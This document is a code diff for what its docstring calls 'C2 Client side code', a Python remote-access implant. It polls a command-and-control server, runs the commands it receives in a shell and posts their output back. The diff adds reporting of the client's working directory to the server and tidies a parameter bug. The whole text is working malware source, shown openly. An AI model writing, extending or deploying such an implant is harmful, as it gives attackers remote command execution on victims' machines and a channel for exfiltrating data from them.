@@ -2,18 +2,18 @@
 """
 C2 Client side code
 """
-from os import chdir, getenv, uname
+from os import chdir, getenv, uname, getcwd
 
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
-from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
 def send_back_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
     try:
-        post(f"http://{C2_SERVER}:{PORT}{RESPONSE_PATH}", data={RESPONSE_KEY: msg}, headers=HEADER, proxies=PROXY)
+        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: msg}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException as e:
         return e
 
@@ -50,6 +50,8 @@ while True:
             send_back_to_server(f"You do not have the permissions to access {dir}.\n")
         except OSError:
             send_back_to_server(f"There was an OS error on the client.\n")
+        else:
+            send_back_to_server(getcwd(), CWD_RESPONSE)
     else:
         cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
         send_back_to_server(cmd_output.stdout)
